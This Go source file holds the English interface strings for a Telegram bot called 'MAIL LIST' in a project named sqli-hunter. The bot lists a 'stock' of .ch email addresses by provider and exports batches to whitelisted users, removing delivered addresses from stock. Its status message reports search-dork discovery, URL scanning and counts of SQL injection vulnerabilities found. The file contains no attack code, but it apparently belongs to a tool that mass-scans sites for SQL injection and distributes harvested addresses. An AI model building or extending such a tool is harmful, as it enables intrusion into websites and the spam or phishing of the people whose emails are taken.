package bot

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

const nameEN = "MAIL LIST"

var en = Texts{
	BotName: nameEN,

	Welcome:       enWelcome,
	StockEmpty:    enStockEmpty,
	StockHeader:   enStockHeader,
	StockLine:     enStockLine,
	StockTotal:    enStockTotal,
	ExtractMenu:   enExtractMenu,
	QuantityAsk:   enQuantityAsk,
	InvalidQty:    enInvalidQty,
	Hint:          enHint,
	Delivery:      enDelivery,
	MaxEmails:     enMaxEmails,
	WriteError:    enWriteError,
	SendError:     enSendError,
	TakeError:     enTakeError,
	AccessDenied:  enAccessDenied,
	MyID:          enMyID,
	BtnExtract:    enBtnExtract,
	BtnBack:       enBtnBack,
	ProviderLabel: enProviderLabel,
	CallbackDenied: enCallbackDenied,
	CallbackEmpty:  enCallbackEmpty,
	Status:         enStatus,
}

func enWelcome(stock string) string {
	return fmt.Sprintf("🇨🇭 *%s*\n_.ch email stock — instant export_\n\n%s", nameEN, stock)
}

func enStockEmpty() string {
	return "📭 *Empty stock*\n\nNo emails available right now."
}

func enStockHeader() string {
	return "📊 *Available stock*\n_unique · not delivered_\n\n"
}

func enStockLine(emoji, provider string, count int) string {
	return fmt.Sprintf("%s `%s` — *%d*\n", emoji, provider, count)
}

func enStockTotal(total int) string {
	return fmt.Sprintf("\n━━━━━━━━━━━━━━━━\n🎯 *Total: %d emails*", total)
}

func enExtractMenu() string {
	return "🗂️ *Pick a provider*\n\n👇 Select a service:"
}

func enQuantityAsk(emoji, provider string) string {
	return fmt.Sprintf("%s *%s* selected\n\n🔢 Send a *number* — how many emails?", emoji, provider)
}

func enInvalidQty(provider string) string {
	return fmt.Sprintf("⚠️ Invalid number.\n\nSend a number for *%s* (e.g. `100`)", provider)
}

func enHint() string {
	return "👆 /start — export emails\n📊 /status — daily progress"
}

func enDelivery(emoji, provider string, count int) string {
	return fmt.Sprintf("✅ *%d emails* delivered\n%s `%s`\n\n🗑️ Removed from stock", count, emoji, provider)
}

func enMaxEmails(max int) string {
	return fmt.Sprintf("⚠️ Max *%d* emails per request.", max)
}

func enWriteError() string  { return "❌ File write error." }
func enSendError(err string) string { return "❌ Send failed: " + err }
func enTakeError(err string) string  { return "❌ " + err }

func enAccessDenied(userID int64) string {
	return fmt.Sprintf("🚫 *Access denied*\n\n🆔 Your ID: `%d`\n\nSend /myid to add it to the whitelist.", userID)
}

func enMyID(userID int64) string {
	return fmt.Sprintf("🆔 *Your Telegram ID*\n\n`%d`\n\n➕ Add it to `TELEGRAM_ALLOWED_IDS`", userID)
}

func enBtnExtract() string { return "📥 Extract" }
func enBtnBack() string    { return "◀️ Back" }

func enProviderLabel(emoji, provider string, count int) string {
	return fmt.Sprintf("%s %s · %d", emoji, provider, count)
}

func enCallbackDenied() string { return "🚫 Access denied" }
func enCallbackEmpty() string  { return "📭 Empty stock" }

func enStatus(scopeN, scannedN int, st results.RunStatus, updatedAgo string) string {
	var b strings.Builder
	b.WriteString("📊 *sqli-hunter progress*\n")
	if updatedAgo != "" {
		b.WriteString(fmt.Sprintf("_updated %s ago_\n", updatedAgo))
	}
	b.WriteString(fmt.Sprintf("phase: *%s*\n", st.Phase))
	if st.DorkTotal > 0 {
		b.WriteString(fmt.Sprintf("dorks: %d/%d\n", st.DorkIndex, st.DorkTotal))
	} else if st.DiscoverPage > 0 {
		b.WriteString(fmt.Sprintf("discover page: %d\n", st.DiscoverPage))
	}
	if st.URLsKept > 0 || st.URLsFetched > 0 {
		b.WriteString(fmt.Sprintf("discover: %d kept · %d fetched", st.URLsKept, st.URLsFetched))
		if st.URLsSkipped > 0 {
			b.WriteString(fmt.Sprintf(" · %d skipped", st.URLsSkipped))
		}
		b.WriteString("\n")
	}
	if st.ScanTotal > 0 || st.Scanned > 0 {
		b.WriteString(fmt.Sprintf("scan: %d/%d · %d vulns · %d findings\n",
			st.Scanned, st.ScanTotal, st.Vulns, st.Findings))
	}
	b.WriteString(fmt.Sprintf("scope_daily: *%d* URLs\n", scopeN))
	b.WriteString(fmt.Sprintf("already scanned: *%d*", scannedN))
	return b.String()
}
